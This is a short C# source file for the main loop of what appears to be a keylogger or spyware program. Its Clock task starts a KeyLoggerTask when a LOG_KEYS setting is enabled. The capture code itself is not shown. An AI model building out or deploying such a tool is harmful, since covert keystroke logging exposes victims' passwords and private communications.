namespace IDK {

    /// <summary>
    /// Main loop of the program
    /// </summary>
    class Clock : Task {

        // all tasks executed by this task
        private KeyLoggerTask KeyLogger;

        /// <summary>
        /// Class constructor
        /// </summary>
        public Clock(int interval) : base(interval) {}

        /// <summary>
        /// Initializes all required tasks. Gets called before the task executes
        /// </summary>
        public override void Initialize() {
            Config config = Config.GetInstance();

            if (config.Settings.LOG_KEYS) {
                KeyLogger = new KeyLoggerTask();
                KeyLogger.Start();
            }
        }

        /// <summary>
        /// Method that gets called when the clock ticks (task needs to update).
        /// This method syncs settings and kills tasks if necessary
        /// </summary>
        public override void Update() {
            // TODO: sync settings and manage tasks
            
        }
    }
}
